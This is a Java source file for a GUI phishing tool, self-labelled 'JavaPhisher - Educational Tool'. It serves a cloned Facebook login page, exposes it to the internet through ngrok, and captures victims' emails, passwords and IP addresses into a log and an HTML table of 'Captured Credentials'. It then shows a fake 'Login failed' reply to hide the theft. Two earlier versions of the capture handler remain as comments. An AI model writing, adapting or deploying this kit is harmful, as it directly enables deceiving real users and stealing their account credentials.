package org.guercifzone.Exmp_1;

import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpExchange;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.io.*;
import java.net.InetSocketAddress;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.List;

public class Fishing_1 {

    private static HttpServer server;
    private static JTextArea logArea;

    public static void main(String[] args) {
        SwingUtilities.invokeLater(Fishing_1::createAndShowGUI);
    }

    private static void createAndShowGUI() {
        JFrame frame = new JFrame("JavaPhisher - Educational Tool");
        frame.setSize(600, 500);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setLayout(new BorderLayout());

        // North Panel for controls
        JPanel topPanel = new JPanel();
        JButton startBtn = new JButton("Start Server");
        JButton stopBtn = new JButton("Stop Server");
        JButton ngrokBtn = new JButton("Launch Ngrok");

        topPanel.add(startBtn);
        topPanel.add(stopBtn);
        topPanel.add(ngrokBtn);

        // Center Panel for log display
        logArea = new JTextArea();
        logArea.setEditable(false);

        logArea.setFont(new Font("Tahoma", Font.PLAIN, 18)); // Arabic-supporting font
        logArea.setLineWrap(true);
        logArea.setWrapStyleWord(true);
      //  logArea.setComponentOrientation(ComponentOrientation.RIGHT_TO_LEFT);

        JScrollPane scrollPane = new JScrollPane(logArea);

        frame.add(topPanel, BorderLayout.NORTH);
        frame.add(scrollPane, BorderLayout.CENTER);

        // Button Actions
        startBtn.addActionListener((ActionEvent e) -> startServer());
        stopBtn.addActionListener((ActionEvent e) -> stopServer());
        ngrokBtn.addActionListener((ActionEvent e) -> launchNgrok());

        frame.setVisible(true);
    }

    private static void startServer() {
        try {
            server = HttpServer.create(new InetSocketAddress(8080), 0);

            // Serve the phishing page
            server.createContext("/", exchange -> {
                byte[] response = Files.readAllBytes(Paths.get("templates/facebook/index.html"));
                exchange.getResponseHeaders().add("Content-Type", "text/html");
                exchange.sendResponseHeaders(200, response.length);
                OutputStream os = exchange.getResponseBody();
                os.write(response);
                os.close();
            });

            // Handle credentials
            server.createContext("/login", new LoginHandler());
            server.setExecutor(null);
            server.start();
            appendLog("Server started at http://localhost:8080");
        } catch (IOException ex) {
            appendLog("Error starting server: " + ex.getMessage());
        }
    }

    private static void stopServer() {
        if (server != null) {
            server.stop(0);
            appendLog("Server stopped.");
        }
    }

    private static void launchNgrok() {
        try {
            ProcessBuilder pb = new ProcessBuilder("ngrok", "http", "8080");
            pb.inheritIO().start();
            appendLog("Ngrok launched. Check terminal or http://localhost:4040");
        } catch (IOException ex) {
            appendLog("Error launching Ngrok: " + ex.getMessage());
        }
    }

    private static void appendLog(String text) {
        logArea.append(text + "\n");
    }

    // Custom login handler that captures form data
   /* static class LoginHandler implements HttpHandler {
        public void handle(HttpExchange exchange) throws IOException {
            if ("POST".equals(exchange.getRequestMethod())) {
                InputStream is = exchange.getRequestBody();
                String formData = new String(is.readAllBytes());

                Map<String, String> params = parseFormData(formData);
                String email = params.getOrDefault("email", "");
                String pass = params.getOrDefault("pass", "");

                String log = "EMAIL: " + email + " | PASS: " + pass;
                Files.write(Paths.get("logs/captured.txt"), (log + "\n").getBytes(), StandardOpenOption.CREATE, StandardOpenOption.APPEND);

                SwingUtilities.invokeLater(() -> appendLog(log));

                String response = "<h2>Login failed</h2><p>Invalid credentials</p>";
                exchange.sendResponseHeaders(200, response.length());
                OutputStream os = exchange.getResponseBody();
                os.write(response.getBytes());
                os.close();
            }
        }

        private Map<String, String> parseFormData(String data) throws UnsupportedEncodingException {
            Map<String, String> map = new HashMap<>();
            for (String pair : data.split("&")) {
                String[] kv = pair.split("=");
                if (kv.length == 2) {
                    map.put(URLDecoder.decode(kv[0], "UTF-8"), URLDecoder.decode(kv[1], "UTF-8"));
                }
            }
            return map;
        }
    }*/
   /* static class LoginHandler implements HttpHandler {
        public void handle(HttpExchange exchange) throws IOException {
            if ("POST".equals(exchange.getRequestMethod())) {
                InputStream is = exchange.getRequestBody();
                String formData = new String(is.readAllBytes());

                Map<String, String> params = parseFormData(formData);
                String email = params.getOrDefault("email", "");
                String pass = params.getOrDefault("pass", "");

                // Get client IP address
                String clientIP = exchange.getRemoteAddress().getAddress().getHostAddress();

                // File path
                Path filePath = Paths.get("logs/captured.txt");
                boolean fileExists = Files.exists(filePath);

                // Build line for table
                String line = String.format("%-30s %-30s %-15s%n", email, pass, clientIP);

                // If new file, add headers
                if (!fileExists) {
                    String header = String.format("%-30s %-30s %-15s%n", "Email", "Password", "IP Address");
                    Files.write(filePath, header.getBytes(), StandardOpenOption.CREATE);
                }

                Files.write(filePath, line.getBytes(), StandardOpenOption.APPEND);

                // Update log on GUI
                String logEntry = "EMAIL: " + email + " | PASS: " + pass + " | IP: " + clientIP;
                SwingUtilities.invokeLater(() -> appendLog(logEntry));

                // Fake failed login response
                String response = "<h2>Login failed</h2><p>Invalid credentials</p>";
                exchange.sendResponseHeaders(200, response.length());
                OutputStream os = exchange.getResponseBody();
                os.write(response.getBytes());
                os.close();
            }
        }

        private Map<String, String> parseFormData(String data) throws UnsupportedEncodingException {
            Map<String, String> map = new HashMap<>();
            for (String pair : data.split("&")) {
                String[] kv = pair.split("=");
                if (kv.length == 2) {
                    map.put(URLDecoder.decode(kv[0], StandardCharsets.UTF_8), URLDecoder.decode(kv[1], StandardCharsets.UTF_8));
                }
            }
            return map;
        }
    }*/
    static class LoginHandler implements HttpHandler {
        public void handle(HttpExchange exchange) throws IOException {
            if ("POST".equals(exchange.getRequestMethod())) {
                InputStream is = exchange.getRequestBody();
                String formData = new String(is.readAllBytes());

                Map<String, String> params = parseFormData(formData);
                String email = params.getOrDefault("email", "");
                String pass = params.getOrDefault("pass", "");

                String clientIP = exchange.getRemoteAddress().getAddress().getHostAddress();

                Path htmlPath = Paths.get("logs/captured.html");
                boolean fileExists = Files.exists(htmlPath);

                String row = String.format("<tr><td>%s</td><td>%s</td><td>%s</td></tr>%n", email, pass, clientIP);

                if (!fileExists) {
                    String html = """
                <!DOCTYPE html>
                <html>
                <head>
                  <title>Captured Credentials</title>
                  <style>
                    body { font-family: Arial, sans-serif; margin: 40px; }
                    table { border-collapse: collapse; width: 100%; }
                    th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
                    th { background-color: #f2f2f2; }
                    tr:nth-child(even) { background-color: #f9f9f9; }
                  </style>
                </head>
                <body>
                  <h2>Captured Credentials</h2>
                  <table>
                    <tr><th>Email</th><th>Password</th><th>IP Address</th></tr>
                """ + row + """
                  </table>
                </body>
                </html>
                """;
                    Files.writeString(htmlPath, html, StandardOpenOption.CREATE);
                } else {
                    // Append row just before </table>
                    List<String> lines = Files.readAllLines(htmlPath);
                    int insertIndex = lines.lastIndexOf("  </table>");
                    if (insertIndex > 0) {
                        lines.add(insertIndex, "    " + row.trim());
                        Files.write(htmlPath, lines);
                    }
                }

                SwingUtilities.invokeLater(() ->
                        appendLog("EMAIL: " + email + " | PASS: " + pass + " | IP: " + clientIP)
                );

                String response = "<h2>Login failed</h2><p>Invalid credentials</p>";
                exchange.sendResponseHeaders(200, response.length());
                OutputStream os = exchange.getResponseBody();
                os.write(response.getBytes());
                os.close();
            }
        }

        private Map<String, String> parseFormData(String data) throws UnsupportedEncodingException {
            Map<String, String> map = new HashMap<>();
            for (String pair : data.split("&")) {
                String[] kv = pair.split("=");
                if (kv.length == 2) {
                    map.put(URLDecoder.decode(kv[0], "UTF-8"), URLDecoder.decode(kv[1], "UTF-8"));
                }
            }
            return map;
        }
    }


}
